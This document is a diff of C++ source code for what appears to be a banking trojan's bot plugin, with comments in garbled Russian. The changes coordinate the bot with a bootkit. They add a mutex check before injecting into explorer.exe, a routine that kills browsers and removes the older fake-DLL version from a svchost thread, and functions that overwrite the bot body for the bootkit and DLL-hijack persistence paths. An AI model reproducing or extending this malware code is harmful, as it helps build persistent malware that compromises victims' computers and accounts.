@@ -19,15 +19,11 @@
 
 
 #include "Crypt.h"
-
+#include "BootkitCrypt.h"
 #include "Modules.h"
-
 #include "ntdll.h"
-
 #include "coocksol.h"
-
 #include "md5.h"
-
 #include "DbgRpt.h"
 
 #pragma comment(linker, "/ENTRY:MyDllMain" )
@@ -199,8 +195,11 @@ BOOL APIENTRY MyDllMain( HMODULE hModule,
 			DLLDBG( "MyDllMain", "Start bot.plug in process %s", buf );
 			if( File::GetNameHashA( buf, true ) == 0x490A0972 ) //стартуем если в процессе проводника (explorer.exe)
 			{
-				BOT::SetBotType(BotBootkit);
-				StartThread(ExplorerMain, NULL);
+				if( BOT::CreateBootkitMutex() )
+				{
+					BOT::SetBotType(BotBootkit);
+					StartThread(ExplorerMain, NULL);
+				}
 			}
 			break;
 		case DLL_THREAD_ATTACH:
@@ -210,6 +209,26 @@ BOOL APIENTRY MyDllMain( HMODULE hModule,
 	}
 	
 	return TRUE;
+}
+
+bool FakeDllDelete()
+{
+	BOT::DeleteBotFile(FakeDllPathBot);
+	//если восстановить оригинальную длл сразу невозможно (ее держит браузер), то восстанавливаем после ребута
+	if( !pMoveFileExA( FakeDllPathOrigDll, FakeDllPathDll, MOVEFILE_REPLACE_EXISTING ) )
+		pMoveFileExA( FakeDllPathOrigDll, FakeDllPathDll, MOVEFILE_REPLACE_EXISTING | MOVEFILE_DELAY_UNTIL_REBOOT );
+	return true;
+}
+
+//функци€ физического удалени€ бота в отдельном процессе
+DWORD WINAPI DeleteFakeDllInSvchost(LPVOID Data)
+{
+	BOT::Initialize(ProcessUnknown);
+	pSleep(10 * 1000); //ждем некоторое врем€
+	DLLDBG( "DeleteFakeDllInSvchost", "Unisntall fake dll" );
+	KillAllBrowsers();
+	FakeDllDelete();
+	return 0;
 }
 
 // ‘-ци€ дл€ прыжка в Explorer при загрузке из StartFromFakeDll
@@ -234,25 +253,39 @@ BOOL WINAPI StartFromFakeDll( const char* pathBotPlug, const char* pathFakeDll, 
 //	BOT::Initialize();
 	DLLDBG("StartFromFakeDll", "StartFromFakeDll pathBotPlug: '%s', pathFakeDll: '%s', pathOrigDll: '%s'", pathBotPlug, pathFakeDll, pathOrigDll );
 
-	// —мотрим на то - запущен ли бот
-	HANDLE BotInstanceMutex = BOT::TryCreateBotInstance();
-	
 	m_lstrcpy( FakeDllPathBot, pathBotPlug );
 	m_lstrcpy( FakeDllPathDll, pathFakeDll );
 	m_lstrcpy( FakeDllPathOrigDll, pathOrigDll );
 
-	DLLDBG("StartFromFakeDll", "BOT::TryCreateBotInstance() result=0x%X", BotInstanceMutex);
-	if (BotInstanceMutex == NULL) return FALSE;
-	pCloseHandle(BotInstanceMutex); //закрываем мютекс, чтобы его снова создали в процессе explorer.exe
+	if( BOT::BootkitIsRun() ) //если запущен буткит, то удал€ем эту версию бота
+	{
+		MegaJump(DeleteFakeDllInSvchost);
+	}
+	else
+	{
+		// —мотрим на то - запущен ли бот
+		HANDLE BotInstanceMutex = BOT::TryCreateBotInstance();
 
-	return (InjectIntoExplorer(ExplorerEntryPointFromFakeDll) ? TRUE : FALSE);
+		DLLDBG("StartFromFakeDll", "BOT::TryCreateBotInstance() result=0x%X", BotInstanceMutex);
+		if (BotInstanceMutex )
+		{
+			pCloseHandle(BotInstanceMutex); //закрываем мютекс, чтобы его снова создали в процессе explorer.exe
+			return (InjectIntoExplorer(ExplorerEntryPointFromFakeDll) ? TRUE : FALSE);
+		}
+	}
+	return FALSE;
 }
 
-bool FakeDllDelete()
+//обновление тела бота, запускаемого буткитом
+bool UpdateBotBootkit( BYTE* data, int c_data )
 {
-	BOT::DeleteBotFile(FakeDllPathBot);
-	//если восстановить оригинальную длл сразу невозможно (ее держит браузер), то восстанавливаем после ребута
-	if( !pMoveFileExA( FakeDllPathOrigDll, FakeDllPathDll, MOVEFILE_REPLACE_EXISTING ) )
-		pMoveFileExA( FakeDllPathOrigDll, FakeDllPathDll, MOVEFILE_REPLACE_EXISTING | MOVEFILE_DELAY_UNTIL_REBOOT );
-	return true;
+	return WriteBotForBootkit( data, c_data );
+}
+
+//обновление тела бота запускаемого через fake.dll
+bool UpdateBotFakeDll( BYTE* data, int c_data )
+{
+	if( File::WriteBufferA( FakeDllPathBot, data, c_data ) == c_data )
+		return true;
+	return false;
 }
